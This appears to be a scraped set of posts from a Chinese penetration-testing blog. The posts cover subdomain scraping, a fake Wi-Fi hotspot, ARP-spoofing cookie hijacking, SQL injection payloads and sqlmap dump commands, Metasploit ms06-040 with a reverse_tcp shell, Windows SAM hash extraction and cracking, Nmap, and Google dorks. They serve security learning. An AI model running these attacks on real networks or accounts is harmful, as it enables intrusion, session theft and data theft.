commit负责的是把暂存去的文件提交了，第二次修改的内容u会被提交。正确步骤：第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git add -&gt; git commitgit diff HEAD –readme.txt 查看工作区和版本库里面最新版本的区别 git checkout –readme.txt 用版本库里的版本替换工作区的版本有两种情况：readme.txt 自修改后还没有放到缓存区，执行后会回到和版本库一模一样的状态。readme.txt 已经添加到暂存区后，又做了修改，总之，是让这个文件回到最近一次git commit 或 git add的状态 git reset HEAD file 把暂存区的修改回退到工作区（unstage） git rm test.txt 删除版本库的test.txt文件 git push -u origin master 将本地库所有的内容推送到远程库上 git checkout -b dev 创建dev分支并切换相当于下面两条命令：git branch dev + git checkout devgit branch 列出所有分支，当前分支会标*号git checkout master 切换到master分支 git merge dev 把dev分支的工作成功合并到master分支上git branch -d dev 删除dev分支 带参数的git log 看到分支的合并情况git log –graph –pretty=oneline –abbrev-commit","categories":[],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"http://www.evilclay.com/tags/GitHub/"}]},{"title":"Python 爬虫获取指定主机子域名及IP信息","slug":"python-spider-subdomain-ip","date":"2015-06-10T09:09:11.000Z","updated":"2016-05-29T03:33:05.951Z","comments":true,"path":"2015/06/10/python-spider-subdomain-ip/","link":"","permalink":"http://www.evilclay.com/2015/06/10/python-spider-subdomain-ip/","excerpt":"","text":"0x 00 前言前天自己在玩的时候，自己通过百度搜索主机的二级域名感觉好麻烦，自已要一页页的去翻 而且人工识别是否是重复的二级域名也够蛋疼的，正好最近在学正则表达式，权当练手了 2016年更新：发现了一些不错的扫子域名的网站，如下 http://subdomain.chaxun.la 0x 01 Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# coding=utf-8# author:Anka9080# environment:Eclipseimport urllibimport urllib2import cookielibimport re#site = 'baidu.com'print 'Please input the root site like \"baidu.com\":'site = raw_input()siteFormat1 = sitesiteFormat1 = siteFormat1.replace('.', '\\.')#print siteFormat1urlPage = 'http://www.haosou.com/s?src=360sou_newhome&amp;q=site:'+sitereq = urllib2.Request(urlPage)res = urllib2.urlopen(req)html = res.read().decode('utf-8')# 获得搜索结果的页面数pageStr = re.search(ur'找到相关结果约(.*?)个',html)page = pageStr.group(1)formatNum = '0123456789'for c in page: if not c in formatNum: page = page.replace(c,'')page = int(page) / 10print 'Total Page: ' + str(page)if page &gt; 6: page = 6newItems = []for p in range(1, page): urlDomain = 'http://www.haosou.com/s?src=360sou_newhome&amp;q=site:'+site+'&amp;pn='+str(p) req = urllib2.Request(urlDomain) res = urllib2.urlopen(req) html = res.read().decode('utf-8') tmp = 'linkinfo\\\"\\&gt;\\&lt;cite\\&gt;(.+?\\.'+siteFormat1+')'; pattern = re.compile(tmp) items = re.findall(pattern, html) # 去重操作 for item in items: if item not in newItems: newItems.append(item)print 'SubDomain Count: '+ str(len(newItems) - 1)for item in newItems: # 获得对应 IP 信息 pattern = re.compile(ur'\\&gt;\\&gt;\\ (.*?)\\&lt;\\/font[\\s|\\S]*?本站主数据：(.*?)\\&lt;\\/li\\&gt;') urlIP = 'http://www.ip138.com/ips138.asp?ip='+item req = urllib2.Request(urlIP) res = urllib2.urlopen(req) html = res.read().decode('gb2312') result = re.search(pattern,html) print item + ' ' + result.group(1) + ' ' + result.group(2) 脚本运行结果如下： Please input the root site like &quot;baidu.com&quot;: baidu.com Total Page: 2 SubDomain Count: 9 www.baidu.com 61.135.169.121 北京市 百度蜘蛛 联通 tieba.baidu.com 123.125.65.93 北京市 联通 fanyi.baidu.com 202.108.23.153 北京市 联通 wenku.baidu.com 123.125.70.102 北京市 百度蜘蛛 联通 map.baidu.com 112.80.248.48 江苏省南京市 联通 music.baidu.com 123.125.114.14 北京市 联通 zhidao.baidu.com 123.125.65.91 北京市 联通 baike.baidu.com 123.125.70.105 北京市 百度蜘蛛 联通 yun.baidu.com 123.125.65.51 北京市 联通 pan.baidu.com 202.108.23.29 北京市 联通 0x 02 总结 思路大概是这个样子： 先通过urllib2.Request() 和 urllib2.urlopen()访问url 再从返回结果中得到搜索结果页面数 为了提高效率 页面数 大于 5 会只爬行搜索结果的前5个页面 后面 又做了去重操作 然后就得到二级域名列表咯 : ) 中间蛋疼的 地方倒是 Py 的 转义符号问题 身边能有个可以问问的大牛多好~ 后期 准备使用 http://dns.aizhan.com/ 的查询结果 直接获得 IP以及旁站信息 ==================6.13号更新==================== 现在已经可以查出二级域名对应的IP地址以及地理位置信息 感觉http://dns.aizhan.com 的调用比较麻烦，接口已经换成 http://www.ip138.com","categories":[],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://www.evilclay.com/tags/信息收集/"},{"name":"Python脚本","slug":"Python脚本","permalink":"http://www.evilclay.com/tags/Python脚本/"}]},{"title":"搭建假冒 WIFI 热点等小(mei)白(zhi)兔(men)来蹭网啊 - -。","slug":"fake-wifi-ap","date":"2015-01-02T08:58:22.000Z","updated":"2016-05-28T09:07:17.907Z","comments":true,"path":"2015/01/02/fake-wifi-ap/","link":"","permalink":"http://www.evilclay.com/2015/01/02/fake-wifi-ap/","excerpt":"","text":"0x 00 ╮(╯▽╰)╭ 请喊我万恶的标题党 哈哈哈哈哈 0x 01 这里正题 虚拟机（Kali）不支持内置网卡，还好我有神器，插上我的RT8187L，开始搞起 参考资料：zone.wooyun.org/content/2562 下面看攻击测试吧 显示热点链接信息 手机链接假冒热点（Fake-Anka） 手机浏览网页截图 电脑端通过driftnet程序截获的图片 上面仅仅是截了张图片验证成功 当然你可以在ettercap抓获Cookie信息进行会话劫持 然后你懂得….. 鉴于KFC，MDL等等 WIFI 一大堆，可行性还是很高的 可以去想一下，如果假冒的热点名和KFC原先的热点名相同，结果会怎么样 : )","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://www.evilclay.com/tags/kali/"},{"name":"WIFI热点伪造","slug":"WIFI热点伪造","permalink":"http://www.evilclay.com/tags/WIFI热点伪造/"}]},{"title":"内网 ARP 欺骗劫持 Cookie 登入百度","slug":"arpspoof","date":"2015-01-02T08:42:41.000Z","updated":"2016-05-29T03:29:13.151Z","comments":true,"path":"2015/01/02/arpspoof/","link":"","permalink":"http://www.evilclay.com/2015/01/02/arpspoof/","excerpt":"","text":"0x 00 ARP欺骗说明欺骗原理相关内容就不多叙述了，Google一大堆 实施ARP欺骗在 Windows 下， Linux 下都相关工具 由于在 Linux 下可以开启 ip_forward 功能，个人认为 Linux 下的工具作用效果比较好，本次测试是在Kali（Linux）中进行 0x 01 攻击测试1、 攻击拓扑 攻击机：Kali Linux IP：192.168.1.109 受害机：Win 7 64位 IP：192.168.1.106 网关IP： 192.168.1.1 攻击工具：arpspoof，tcpdump，hamster，ferret 前三款工具已经集成在Kali中，ferret需要手动安装 2、 安装ferret (1) 修改正确的软件安装源(2) 添加Kali对32位应用程序的支持 1dpkg --add-architecture i386 (3) 更新安装源 1apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y (4) 安装ferret 1aptitude install ferret-sidejack:i386 3、 打开路由转发（临时生效） 1echo \"1\" &gt; /proc/sys/net/ipv4/ip_forward 4、 开始 ARP 欺骗 5、 新开一个Shell，抓取通过eth0接口的输出cookie.cap文件 6、 受害机使用浏览器模拟百度账号登陆过程，或刷新已经登录的页面 7、 结束第4，第5步打开的进程 8、 使用ferret处理抓到包cookie.cap 9、 架设hamster代理服务器 10、 浏览器设置代理后，重启浏览器访问127.0.0.1:1234 在上面可以看到截取的Cookie信息，打开链接就可以了 PS：就不打码了， 大虾手下留情 - -。 11、 测试攻击效果 进贴吧发留言测试一下 ~~ Summary： 这种局域网ARP劫持是因为ARP协议设计缺陷被动更新ARP缓存表造成，不是很好防范 可以在路由器里静态绑定ARP条目减少避免危害 如果目标网站的安全性做的很好，劫持后拿到的Cookie也很难成功利用 安全是多方的，服务提供方和使用者都应该做出安全措施 最重要的是 见到匿名热点神马的不要随随便便就连上啊 很可能下一个小白鼠就是你…..","categories":[],"tags":[{"name":"Kali","slug":"Kali","permalink":"http://www.evilclay.com/tags/Kali/"},{"name":"Cookie劫持","slug":"Cookie劫持","permalink":"http://www.evilclay.com/tags/Cookie劫持/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.evilclay.com/tags/内网渗透/"}]},{"title":"SQL注入利用神器 SQLMap 的介绍与 Demo","slug":"sqlmap","date":"2014-11-26T08:05:01.000Z","updated":"2016-05-28T08:40:38.299Z","comments":true,"path":"2014/11/26/sqlmap/","link":"","permalink":"http://www.evilclay.com/2014/11/26/sqlmap/","excerpt":"","text":"0x 00 前言正是SQLMAP这种神器的存在，SQL注入简直Easy到根本停不下来…. PS：国内类似软件也有阿D，明小子，挖掘机，当你用过他们之后你才会发现SQLMap才是绝对的注入神器 0x 01 注入原理存在注入的原因是因为后台在编写程序时，没有对用户输入的数据做过滤导致的，正如事实上，不是所有的用户都是友好的 比如：用户在某个输入框提交的参数是 2 浏览器提交的URL为: http:// www.XXX.com/index.php?id=2 服务器后台执行SQL语句： select * from table1 where id = 2 返回Response，浏览器解析返回的页面，然后你就看到新的页面了 如果邪恶的用户提交的参数是 2;drop table1 服务器后台执行SQL语句： select * from table1 where id =2 ; drop table1 相当于后台执行了两条SQL语句，查表，并且把table1删除 - - 从而导致了SQL注入。 按照这个思路，现在写一下手工注入的一般步骤： 1、 判断是否存在注入点（数字型注入） www.XXX.com/index.php?id=2‘– www.XXX.com/index.php?id=2 and 1=1 – www.XXX.com/index.php?id=2 and 1=2 – 第2条返回正常，第1，3条返回不正常说明id参数存在注入漏洞 2、 判断数据库类型 可以根据不同数据库特有的表，或者根据不同数据库的语法不同进行判断 www.XXX.com/index.php?id=2 and exists(select * from sysobjects) – 返回正常是SQLServer 数据库 www.XXX.com/index.php?id=2 and exists(select * from msysobjects) – 返回正常是Access 数据库 www.XXX.com/index.php?id=2 and len(‘a’) = 1 – 返回正常是SQLServer或者MySQL www.XXX.com/index.php?id=2 and substring(‘abc’,’1’,’1’) = a – 返回正常是SQLServer www.XXX.com/index.php?id=2 and subStr(‘abc’,’1’,’1’)= a – 返回正常是Oracle 知道是哪种类型数据库后就可以选择对应语法构造SQL语句进行攻击 3、 判定是否存在admin表 www.XXX.com/index.php?id=2 and exists(select * from admin) – 返回正常 存在admin表 4、猜admin表中的字段名 www.XXX.com/index.php?id=2 and exists(select username from admin) – 返回正常 表示admin表存在username字段 5、 猜字段值 www.XXX.com/index.php?id=2 and exists(select * from admin where id =1 and asc(mid(username,1,1))) &lt; 100 – 返回正常说明username中有ascii码小于100的字母，然后根据折半发准确判断是哪一个字符 以上是 SQLServer的手工注入步骤，在MySQL和Oracle中略有不同，思路还是这个样子~~ 0x 02 安装SQLMap1. 安装python 官网https://www.python.org/ 选择最新版本下载安装即可 因为SQLMap使用Python写的 ，所以没有Python的环境SQLMap无法运行 2. 安装SQLMap 官网 http://sqlmap.org/ 选择最近版本安装即可 3. 设置环境变量 为了使用便利，将SQLMAP的安装目录添加到系统环境变量中 之后在CMD中就可以直接使用SQLMap了 不设置环境变量的话，要把CMD的当前目录切换到SQLMap安装目录才可以使用 0x 03 SQLMap常用命令介绍1. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; 判断id参数是否存在注入：结果中包含 “id” is Vulnerable 字段表示存在注入 存在注入，下面的步骤才可以执行成功~ 2. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; --dbs 列举能列出的所有数据库名 3. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; --current-db 列出当前使用的数据库名，假设列出“sqltest”数据库 4. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; --is-dba 判断该注入点是否有管理员权限：返回true 表示是管理员 5. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; -D &quot;sqltest&quot; --tables 获取sqltest中的所有表，假设有”admin”表 6. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; -D &quot;sqltest&quot; -T &quot;admin&quot; --columns 列举表admin的字段（列名），假设存在”username”,”password”字段 7. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; -D &quot;sqltest&quot; -T &quot;admin&quot; -C &quot;username,password&quot; --dump 下载字段 username，password 的值，若询问是否破解 md5 加密，选择 no 即可 至此，对一个简单的注入点（GET方式），现在就已经得到了我们想要的数据 想看工具的注入过程 使用-v参数 –level 设置注入等级（1-5） 默认1 只会判断get，post参数是否有注入点 为2或者2以上的时候也会测试HTTP Cookie头的值 为3或者3以上的时候会尝试对User-Agent,referer注入 若不确定注入点设置 –level 为 5 –risk 设置风险等级（1-4） 默认是1会测试大部分的测试语句 为2会增加基于事件的测试语句 为3会增加OR语句的SQL注入测试 当然用burp Suite架个代理，截取数据包，直接 -r 参数引入数据包也可以完成上述的注入情况的，命令如下: sqlmap.py -r &quot;request.txt&quot; --level 5 0x 04 注入Demo本次演示使用Apache+Php +Mysql 环境，其他环境的话 使用SQLMap输入还是相同的命令，这点SQLMap做的好方便 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ //测试id是否可以注入 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ –dbs //列所有数据库名 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ –current-db //列出当前数据库 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ –is-dba //判断注入点是否有管理员权限 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ -D “test” –tables //猜表名 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ -D “test” -T “test” –columns //猜字段名 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ -D “test” -T “test” -C “id,name” –dump //猜id和name的值 网络上流传的脱裤 用的可就是下面的一句话 sqlmap.py -u “http://127.0.0.1/sqlinject.php?id=1“ -D “test” –dump-all 突然发现 强大的东西往往仅仅是一句话 ! ! 这条命令会直接把test数据库中所有的表全部下载到安装目录output文件夹中 然后就有了 2000W xxx 800W xxx ………………..你懂得","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://www.evilclay.com/tags/安全工具/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://www.evilclay.com/tags/SQL注入/"},{"name":"SQLMap","slug":"SQLMap","permalink":"http://www.evilclay.com/tags/SQLMap/"}]},{"title":"Nessus 多功能扫描器","slug":"nessus","date":"2014-11-26T07:53:11.000Z","updated":"2016-05-28T08:04:23.750Z","comments":true,"path":"2014/11/26/nessus/","link":"","permalink":"http://www.evilclay.com/2014/11/26/nessus/","excerpt":"","text":"0x 00 前言 写这篇博客，证明我还活着…… 0x 01 安装Nessus 直接官网 www.tenable.com/products/nessus/select-your-operating-system 选择Nessus Home版下载，下载之后点击安装我这里是Nessus-6.1.0-x64版（附件处有百度网盘链接） 安装开始设置一个用户名和密码（记住，使用Nessus时会验证） 然后选择文件安装目录 之后会提示更新插件，这个要通过官网注册获取激活码来更新的 在官网 www.tenable.com/products/nessus/evaluate 注册账户，打开注册邮箱就可以收到激活码了~ 注意：注册邮箱不能使用 qq\\163\\gmail\\hotmail 等公共邮箱，要用企业邮箱才可以 在这里推荐使用“一小时邮箱”进行注册，具体使用方法自行 Google 填好激活码之后，插件自动更新，我这里5分钟左右就更新好了 0x 02 软件使用 浏览器打开 https://localhost:8834 后显示客户端界面 输入先前设置的用户名密码登录 1. 扫描局域网存活主机 点击 “New Scan”， 在提供的默认模版里选择一个模版，这里选择 “Host Discovery”， 在弹出的通用配置里设置 “Name”（本次扫描的名字）， “Target”（扫描目标） 我扫的是 192.168.1.1 全网段的 ，看图 之后“点击保存”后会进行自动扫描 2分钟之后结果就来了，在这里 看到了米有，9个主机在线，测试结果与真实环境相同的 NMAP也能完成主机探测我会乱说，所以说Nessus牛的地方不是在这，所以下面来了 2. 主机扫描 我在本地搭了个低版本服务器，IP为192.168.1.112 新建扫描，设置扫描策略为“Advanced Scan”， 然后 “Target”填上192.168.1.112 因为扫的是同个局域网内的速度还是比较快的，结果倒是让我惊呆了Orz… 20个紧急漏洞，8个高危漏洞，醉了有木有 = = 速度戳之 上面MSxx-xxx是微软漏洞编码，随随便便选择一个找到Exp就可以愉悦的玩耍了 ~~ 接下来漏洞结合MSF进行漏洞利用~ 当然，直接根据漏洞的编码百度一下利用方法也是可以的，这里就直接用BT5吧 找一个比较老的洞：ms06-040 BT5/Kali 的 CMD 输入 msfconsole 进入MSF欢迎界面（时间略长，等下就OK了） 我们按照MSF的一般执行过程来操作 选择漏洞模块 —&gt; 设置PAYLOAD —&gt; 设置参数 —&gt; 攻击 search ms06_040 // 搜索模块 找到对应模块后 use exploit/windows/smb/ms06_040_netapi // 使用ms06_040_netapi模块 show options // 查看漏洞配置信息 set PAYLOAD windows/shell/reverse_tcp // 设置PAYLOAD set RHOST 192.168.1.112 // 设置目标IP set LHOST 192.168.1.117 // 设置本机IP // 端口号 和 目标类型 默认就OK了 exploit // 进行攻击 然后看拿到拿到了神马…… 附件: Nessus-6.1.0-x64 百度网盘：pan.baidu.com/s/1hq48j20 9fgu","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://www.evilclay.com/tags/安全工具/"},{"name":"Nessus","slug":"Nessus","permalink":"http://www.evilclay.com/tags/Nessus/"}]},{"title":"破解 Windows 7/8 登录密码","slug":"pojie-windows-login","date":"2014-10-25T07:27:16.000Z","updated":"2016-05-28T08:56:30.628Z","comments":true,"path":"2014/10/25/pojie-windows-login/","link":"","permalink":"http://www.evilclay.com/2014/10/25/pojie-windows-login/","excerpt":"","text":"// 文末有惊喜：） 0x 00 破解思路用户的明文密码经过单向Hash加密生成Hash散列，Hash散列又被加密存放在系统盘\\Windiws\\System32\\config文件下 要获得明文就要先得到SAM文件，从中提取出hash散列，然后网上查询或者暴力破解获得明文密码 SAM文件的获取可分为两种方法： 1）直接从本机操作系统获取； 2） 利用安装了Linux（或是WinPE）的U盘获取； 获得SAM文件以后可以很简单的提取到用户的hash散列，然后就是破解部分了 直接上hash破解网站，让网站解密，简单粗暴，不过需要Money~ 也可以在本机暴力破解，因为单项加密的不可逆性 破解过程实际上是一堆字母组合做hash加密，得到的结果与密文做对比 并不是真正的破解，还好计算机有强大的计算能力 = =！ 0x 01 破解测试环境&gt;&gt; 被破解主机：win 7 旗舰版 64位 工具：bkhive（生成bootkey文件 用于提取hash散列） samdump2 （提取hash工具） john （暴力破解hash得明文） 上面三个工具都已经集成在U盘(kali)中 由于亲测Win8和 Win7 的加密算法一样，加密文件存放位置也是相同的 这里就演示Win7下的 1、 生成被破解账户 Win7 CMD下，创建两个待破解用户 net user Frank 1t2e3n /add net user Alice xy4567 /add 2、 提取SAM文件 将本机设置为U盘启动，插上U盘，进入kali 打开我的电脑，点击Win7的系统盘图标，这时候kali已经把Win7系统盘（Win7OS）挂载到 /media下，把/media/Win7OS/Windows/System32/config/下的SAM文件和SYSTEM文件复制出来，需要注意大小写 3、 提取hash散列 先用bkhive从SYSTEM文件生成一个bootkey文件 再使用samdump2工具从SAM文件和bootkey中提取出hash散列 /* 在/tmp目录下执行 */ bkhive SYSTEM bootkey samdump2 bootkey SAM &gt; hashes.txt hash散列就被保存在/tmp/hashes.txt中，格式如下： 现在windows的大多数操作系统已经使用NTLMv2加密方式，所以得到的LM散列一般没什么用（空字符加密的结果）上面的NTLM字符串就是我们想要得到的hash散列 0x 04 破解hash如果原先明文密码长度在6位以内我们可以使用John the Ripper这款工具进行爆破，很简单的 在本机测试的结果是不到一小时所有的6位长度的密码都可以破解成功 /* 在tmp目录下执行 */ john hashes.txt --format=nt2 // nt2 表示使用NTLMv2破解方式 然后就可以撸啊撸(xD)去了，让他自己跑呗(其实我去睡午觉了我会乱说~) 在然后就没了，看截图 Frank 和 Alice的 password 已经出来~ 大致的算了一下 john 破解NTMLv2的速度大致一秒钟100多万条吧 所以说 跑个一个小时也没有结果建议网上解密，hashkiller，cmd5 都是不错的网站 上面倒腾了一大堆，看着也够麻烦的，要是你瞟到了这里说明你赚了 ：) 如果正常进入本机的话可以直接提取hash的，Windows下神器PwDump7在这，直接运行.exe就可以，地址贴在后面 如果你想要直接获得本机账户密码的话，也可以，在桌面上运行mimikatz2，法国牛人写的，确实赞，不过报毒 …. 如果拿到SYSTEM和SAM文件，在Windows下也有获取hash的工具 SAMInside，导入文件即可 如果进不了也可以在CMD模式下COPY文件到U盘然后，取出hash破解 当然，在这篇文件里写的都是破解登录密码，而非清除（重置） 因为清除重置什么的和砸破窗户跳进去有什么区别… ：) 工具下载： PwDump7 百度网盘 http://pan.baidu.com/s/1kT9RcjX 密码: bb1s mimikatz2 百度网盘 http://pan.baidu.com/s/1jGoouA6 密码: iakf SANInside 百度网盘 http://pan.baidu.com/s/1D7jUu 密码: 91ud","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://www.evilclay.com/tags/kali/"},{"name":"密码破解","slug":"密码破解","permalink":"http://www.evilclay.com/tags/密码破解/"}]},{"title":"Nmap 端口扫描利器","slug":"nmap","date":"2014-09-17T07:11:56.000Z","updated":"2016-05-28T07:50:56.106Z","comments":true,"path":"2014/09/17/nmap/","link":"","permalink":"http://www.evilclay.com/2014/09/17/nmap/","excerpt":"","text":"作为时下流行的端口扫描工具，Nmap有因其扫描的隐密性有“端口扫描之王”之称 上图是黑客帝国（The Matrix）中崔妮蒂用Nmap入侵核发电站的能源管理系统 0x 00 Nmap介绍Nmap是一款用于网络发现和安全审计的安全工具，常用于端口扫描。 用法： nmap [扫描类型] [参数] 目标IP 扫描类型 -sT TCP 连接扫描，会在目标主机中记录大量的链接请求和错误信息 -sS SYN扫描，只完成三次握手前两次，很少有系统记入日志，默认使用，需要root(admin)权限 -sP Ping扫描，默认使用，只有能Ping得通才会继续扫描 -P0 扫描之前不需要Ping，用于绕过防火墙禁Ping功能 -sA 高级的扫描方式，用来穿过防火墙的规则集 -sV 探测端口号版本 -sU UDP扫描，扫描主机开启的UDP的服务，速度慢，结果不可靠 -sX -sN 秘密的FIN数据包扫描，圣诞树(Xmas Tree)和空模式，针对Unix和Linux主机，系统要求遵循TCP RFC文档 0x 01 扫描案例 1. 扫描C段（局域网）存活主机 nmap -sP www.XXX.com/24 nmap -sP 192.168.1. （注释：“”为通配符） 2. 扫描指定IP开放端口号 nmap -sS -p- -v 192.168.1.100 -p-为全端口扫描，和[1-65535]一样，建议使用 不使用默认Nmap认为危险的100个端口号 3. 扫描指定IP所开端口及服务版本 nmap -sV -v 192.168.1.100 4. 探测主机操作系统 nmap -O www.XXX.com 扫描准确度以百分比显示，未必准确 5. 穿透防火墙扫描 nmap -P0 www.XXX.com 6. 全面探测，-A包含OS 探测，版本探测，脚本扫描，traceroute nmap -A www.XXX.com 7. 使用脚本扫描 nmap –script=”脚本名称” www.XXX.com 如在局域网上扫找 Conficker 蠕虫病毒 nmap -PN -T4 -p139,445 -n -v –script=smb-check-vulns –script-args safe=1 192.168.0.1-254 脚本放在Nmap安装目录script下，官网可查各个脚本功能 多说两句 ~有一款工具叫做 Zmap ，是定位于全球扫描的端口扫描，据说1小时可以扫描全球开了80端口的主机。这种东西怎么说呢，要不就舍弃细节做到高效率扫描比如Zmap，要不就注重细节，做到精细扫描，比如可以探测OS指纹，Web后端指纹，CMS框架，这两种不同的工具的作用领域不同而已，没什么好坏之分。想要对 Nmap 深入了解，读读官方文档吧，会对你写一些扫描工具有帮助的 :)","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://www.evilclay.com/tags/安全工具/"},{"name":"Nmap","slug":"Nmap","permalink":"http://www.evilclay.com/tags/Nmap/"},{"name":"端口扫描","slug":"端口扫描","permalink":"http://www.evilclay.com/tags/端口扫描/"}]},{"title":"目录扫描 DirBuster 与 御剑 使用Demo","slug":"find-dir","date":"2014-09-16T06:51:58.000Z","updated":"2016-05-28T07:46:43.808Z","comments":true,"path":"2014/09/16/find-dir/","link":"","permalink":"http://www.evilclay.com/2014/09/16/find-dir/","excerpt":"","text":"要想熟悉目标网站的体系架构，知道网站有哪些目录是必不可少的向AWVS，Burp类大型扫描工具也可以进行目录扫描，不过无论是目录扫描还是SQL 注入，综合型的工具远没有专业扫描工具来的简单，实在。 期待能有一个扫描器抓扫弱点URL资源的，好像已经有白帽子在开发了。 0x00 DirBuster DirBuster是Owasp(开放Web软体安全项目- Open Web Application Security Project )开发的一款专门用于探测Web服务器的目录和隐藏文件。由于使用Java编写，电脑中要装有JDK才能运行。DirBuster 扫描二级目录的策略有两个：1，爬行网站；2，暴力破解。 配置说明 点击Options—Advanced Options打开如下配置界面 在这里可以设置不扫描文件类型，设置遇到表单自动登录，增加HTTP头（Cookie……）， 以及代理设置，超时链接设置，默认线程，字典，扩展名设置 有时间的小伙伴自己捣鼓捣鼓 ，这里不多说了 扫描测试 本地搭建了一个Dede站，直接开撸 在第4步中也可以选择纯暴力破解模式，命中率不高，相比之下还是模糊测试好用些 （坏笑~）上面有一个小错误，在第7步的时候，扫目标站下的目录应该填写/DedeCms5.7/{dir} 不知道细心的小伙伴发现了没~ 否则的话扫的就是127.0.0.1：8080下的目录了 扫描结果 这是本地扫描目录列表，点击TreeView可以自己查看目录树 0x 01 御剑 国内第一后台扫描神器,不用配置，御剑只会做字典扫描，不做爬虫扫描，填上网站，只需要点一下就够了，上图 简单粗暴，适合使用，期待御剑的其他作品。 Summary： 前面文章已经说过了，对于目录扫描我们可以手动查看robots.txt，说不定后台就放在里面。 还是那句话，一个扫描器扫描结果不理想时，我们大可以两个扫描器一起上。工具是死的，要学会灵活使用 ! 一般来说一个靠谱的目录扫描器可以从两方面入手： 爬行本网站以及搜索引擎的相关URL并做去重处理 找一个靠谱的字典去做 fuzzing 子域名探测和目录扫描的思路是一样的，对于子域名探测可以写个爬虫爬取专门探测子域名网站上的结果。","categories":[],"tags":[{"name":"DirBuster","slug":"DirBuster","permalink":"http://www.evilclay.com/tags/DirBuster/"},{"name":"御剑","slug":"御剑","permalink":"http://www.evilclay.com/tags/御剑/"},{"name":"目录扫描","slug":"目录扫描","permalink":"http://www.evilclay.com/tags/目录扫描/"},{"name":"安全工具","slug":"安全工具","permalink":"http://www.evilclay.com/tags/安全工具/"}]},{"title":"GoogleHacking ，搜你想要的","slug":"GoogleHacking","date":"2014-09-15T06:12:59.000Z","updated":"2016-05-28T06:46:37.356Z","comments":true,"path":"2014/09/15/GoogleHacking/","link":"","permalink":"http://www.evilclay.com/2014/09/15/GoogleHacking/","excerpt":"","text":"第一次接触到“GoogleHacking”是在学校初次Geek大赛上。很有意思的一道题目，网页中原题大致是这样的： 下面是数学之美（吴军著）的封面，请找出这本书的ISBN码（这一关的Key值） 很不幸，图片中ISBN码被可恶的 ████ 盖上了，好想“扣开涂层辨真伪”的说。。。还是习惯性的查源文件，看看有没有蛛丝马迹，无果，完了把这张图片下载下来在本地以记事本打开，一堆乱码，同样没有找到想要的结果实在无奈了又仔细看了遍题目，什么？（“么”声音拉长，表示惊讶~）不是有书名作者么……找不到我可以问度娘啊，为什么一定要在这张图片上折腾呢 然后速上百度，妈妈再也不用担心我找不到ISBN了 !上面这则小事没用到GoogleHacking相关技巧，不过思路倒是有的，有Google，Bing，Baidu(划掉)这些搜索神器，一定要好好去利用他们 ! 0x 00 GoogleHack语法 关键字： Site 指定域名 Intext 正文中出现关键字的网页 Intitle 标题中出现关键字的网页 Info 一些基本信息包含关键字的网页 Inurl url中存在关键字的网页 Filetype 指定文件类型 Cache Google搜索缓存的网页副本 常见操作符： . 单一的通配符 * 通配符，可代表多个字母 “” 精确查询 0x 01 常用案例 1. 搜索指定网站的子域名 site:XXX.com 2. 搜索指定网站的管理员入口 intitle:管理登陆 site:XXX.com intitle中的关键字可以换成后台，后台管理，管理员…… inurl:login site:XXX.com inurl中的关键字也可以换成guanlidenglu，admin…… 3. 搜索指定网站的doc文档（Excel/PDF/PPT） site:XXX.com filetype:doc 4. 收集Discuz论坛主机 intext:Powered by Discuz 5. 收集某网站的Google快照 cache:XXX.com 6. 搜索某网站的公共FTP用户 site:XXX.com intext:ftp://: 另外还有早些年使用查询存在SQL注入漏洞的网站： inurl:asp?id= 这个是很早很早出现的漏洞了，绝大部分网站已经修补该漏洞，不过好像依然存在“漏网之鱼” ! 在这里写几点说明： ★ 语法中”:”是半角冒号，”:”前后没有空格 ★ google不区分大小写，SITE与site结果是一样的 ★ 不要单一的使用Google或是Baidu，Baidu的本土化运营毕竟存在优势，结合使用 ! ★ ZoomEye， Shodan 自己去寻找它吧，你发现更大的世界。","categories":[],"tags":[{"name":"GoogleHacking","slug":"GoogleHacking","permalink":"http://www.evilclay.com/tags/GoogleHacking/"},{"name":"信息收集","slug":"信息收集","permalink":"http://www.evilclay.com/tags/信息收集/"}]},{"title":"HTTP 协议分析及 CMD 发送 HTTP 请求","slug":"send-http-with-telnet","date":"2014-09-14T05:17:55.000Z","updated":"2016-05-28T06:46:44.940Z","comments":true,"path":"2014/09/14/send-http-with-telnet/","link":"","permalink":"http://www.evilclay.com/2014/09/14/send-http-with-telnet/","excerpt":"","text":"学习，熟悉HTTP协议，便于以后进行HTTP重放攻击！ 0x 00 HTTP 协议分析 查看 HTTP 协议 先查看鼠标点击一个链接后，浏览器发出了怎样的HTTP请求。Chrome浏览器下，按F12进入开发者模式，点击Network后，在页面中随意点击链接测试，出现下图: 上面的news.baidu.com 就是点击新闻后发出的一条信息相关内容，在图中我们大致可以看到 有请求主机，IP地址，请求方式，以及返回的状态码（200） HTTP 请求介绍 http请求由三部分组成，请求行，请求头，请求主体。 下面给出一个实例： 1 POST /login.php HTTP/1.1 // 请求行 包含请求方法，请求地址，协议版本 2 HOST: www.XXX.com // 请求头 3 // 空一行，表示请求头结束 4 username=admin &amp; password=admin // 请求正文 Cookie相关信息 